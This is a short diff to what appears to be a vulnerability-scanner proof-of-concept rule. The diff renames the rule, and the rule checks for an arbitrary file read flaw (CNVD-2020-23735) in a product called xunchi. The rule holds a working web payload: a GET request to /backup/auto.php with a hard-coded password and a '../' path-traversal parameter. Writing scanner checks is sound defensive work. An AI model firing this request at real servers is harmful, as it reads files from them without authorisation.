@@ -1,4 +1,4 @@
-name: poc-yaml-xunchi-cnvd-2020-23735-anyfile-read
+name: poc-yaml-xunchi-cnvd-2020-23735-file-read
 rules:
   - method: GET
     path: /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
